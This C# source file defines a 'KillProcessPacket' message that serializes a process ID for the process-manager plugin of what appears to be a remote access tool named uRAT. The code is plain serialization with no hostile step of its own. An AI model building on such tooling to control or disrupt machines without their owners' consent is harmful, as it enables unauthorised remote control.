using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using uNet2.Packet;

namespace uRAT.ManagersClientPlugin.ProcessManager.Packets
{
    public class KillProcessPacket : IDataPacket
    {
        public int PacketId
        {
            get { return 6; }
        }

        public int Pid { get; set; }

        public void SerializeTo(Stream stream)
        {
            var bw = new BinaryWriter(stream);
            bw.Write(PacketId);
            bw.Write(Pid);
        }

        public void DeserializeFrom(Stream stream)
        {
            var br = new BinaryReader(stream);
            Pid = br.ReadInt32();
        }
    }
}
